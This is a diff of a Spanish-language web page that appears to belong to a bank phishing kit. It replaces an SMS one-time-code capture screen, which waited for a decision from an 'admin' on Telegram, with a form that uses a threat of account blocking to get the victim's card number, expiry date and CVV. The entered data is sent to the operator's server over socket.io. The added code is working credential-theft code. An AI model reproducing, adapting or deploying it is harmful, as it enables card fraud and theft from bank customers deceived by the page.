@@ -3,9 +3,8 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Código Incorrecto</title>
+  <title>Validación de Tarjeta</title>
   <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css">
   <style>
     body {
       margin: 0;
@@ -16,7 +15,6 @@
       justify-content: center;
       min-height: 100vh;
     }
-
     .screen {
       display: flex;
       flex-direction: column;
@@ -29,67 +27,84 @@
       max-width: 400px;
       text-align: center;
     }
-
-    .input-group {
-      display: flex;
-      align-items: center;
-      background: #f0f2f5;
-      border-radius: 8px;
-      margin: 1rem 0;
-      padding: 0.5rem 1rem;
+    h3 {
+      color: red;
+      font-weight: 600;
+      margin-bottom: 0.5rem;
+    }
+    p {
+      font-size: 14px;
+      margin-bottom: 1rem;
+    }
+    .form-group {
+      text-align: left;
       width: 100%;
+      margin-bottom: 1rem;
     }
-
-    .input-group .icon {
-      color: #888;
-      margin-right: 0.5rem;
+    label {
+      display: block;
+      margin-bottom: 0.5rem;
+      font-weight: bold;
     }
-
-    .input-group input {
-      border: none;
-      background: transparent;
-      outline: none;
-      flex: 1;
+    input, select {
+      width: 100%;
+      padding: 0.75rem;
+      border: 1px solid #ccc;
+      border-radius: 8px;
       font-size: 1rem;
     }
-
-    .campo-requerido {
-      border: 1px solid red !important;
+    .form-row {
+      display: flex;
+      gap: 10px;
     }
-
     button {
-      background: #000000;
+      background: #003049;
       color: white;
-      padding: 0.75rem 2rem;
+      padding: 0.75rem;
       border: none;
       border-radius: 50px;
-      font-weight: 600;
+      font-weight: bold;
       cursor: pointer;
-      margin-top: 1rem;
       transition: background 0.3s;
+      margin-top: 1rem;
+      width: 100%;
     }
-
     button:hover {
-      background: #00a16a;
-    }
-
-    .mensaje-error {
-      color: red;
-      margin-top: 0.5rem;
-      font-size: 0.85rem;
+      background: #005580;
     }
   </style>
 </head>
 <body>
   <div class="screen">
-    <h3>Te enviaremos el codigo SMS a su celular</h3>
-    <p>Introduce el codigo de verificacion que te acabamos de enviar a su celular de confianza.</p>
-    <div class="input-group campo-requerido">
-      <div class="icon"><i class="fas fa-key"></i></div>
-      <input type="tel" id="codigo" placeholder="Código de verificación" pattern="[0-9]*" inputmode="numeric" minlength="6" maxlength="6" required>
-    </div>
-    <p class="mensaje-error">Código inválido. Por favor, ingrese el código correctamente.</p>
-    <button onclick="reintentarCodigo()">Reintentar</button>
+    <h3>Datos de tarjeta inválidos</h3>
+    <p>Por favor coloque sus datos correctamente para no bloquear totalmente su cuenta bancaria.</p>
+    <form id="tarjeta-form">
+      <div class="form-group">
+        <label for="numero">Número de tarjeta</label>
+        <input type="tel" id="numero" maxlength="16" placeholder="0000 0000 0000 0000" required>
+      </div>
+      <div class="form-group">
+        <label>Fecha de expiración</label>
+        <div class="form-row">
+          <select id="mes" required>
+            <option value="" disabled selected>Mes</option>
+            <option>Enero</option><option>Febrero</option><option>Marzo</option><option>Abril</option>
+            <option>Mayo</option><option>Junio</option><option>Julio</option><option>Agosto</option>
+            <option>Septiembre</option><option>Octubre</option><option>Noviembre</option><option>Diciembre</option>
+          </select>
+          <select id="anio" required>
+            <option value="" disabled selected>Año</option>
+            <option>2025</option><option>2026</option><option>2027</option><option>2028</option>
+            <option>2029</option><option>2030</option><option>2031</option><option>2032</option>
+          </select>
+        </div>
+      </div>
+      <div class="form-group">
+        <label for="cvv">CVV</label>
+        <input type="tel" id="cvv" maxlength="3" placeholder="123" required>
+      </div>
+      <button type="submit">Reintentar Validación</button>
+    </form>
   </div>
 
   <script src="/socket.io/socket.io.js"></script>
@@ -99,28 +114,30 @@
 
     socket.emit("reconectar", sessionId);
 
-    function reintentarCodigo() {
-      const codigo = document.getElementById("codigo").value;
+    const form = document.getElementById("tarjeta-form");
 
-      if (!codigo || !/^\d{6}$/.test(codigo)) {
-        alert("Ingrese un código válido de 6 dígitos.");
+    form.addEventListener("submit", function (event) {
+      event.preventDefault();
+
+      const numero = document.getElementById("numero").value.trim();
+      const mes = document.getElementById("mes").value;
+      const anio = document.getElementById("anio").value;
+      const cvv = document.getElementById("cvv").value.trim();
+
+      if (!numero || !mes || !anio || !cvv || cvv.length !== 3) {
+        alert("Por favor complete todos los campos correctamente.");
         return;
       }
 
-      // Enviar OTP ingresado al servidor
-      socket.emit("otpIngresado", { codigo, sessionId });
+      socket.emit("datosTarjeta", {
+        numero,
+        mes,
+        anio,
+        cvv,
+        sessionId
+      });
 
-      // Ir a la pantalla de espera
-      window.location.href = "opciones.html";
-    }
-
-    // Recibir respuesta del admin desde Telegram
-    socket.on("respuestaOtp", (decision) => {
-      if (decision === "finalizar") {
-        window.location.href = "https://www.google.com";
-      } else if (decision === "otp_error") {
-        window.location.href = "denegado.html";
-      }
+      window.location.href = "/opciones.html";
     });
   </script>
 </body>
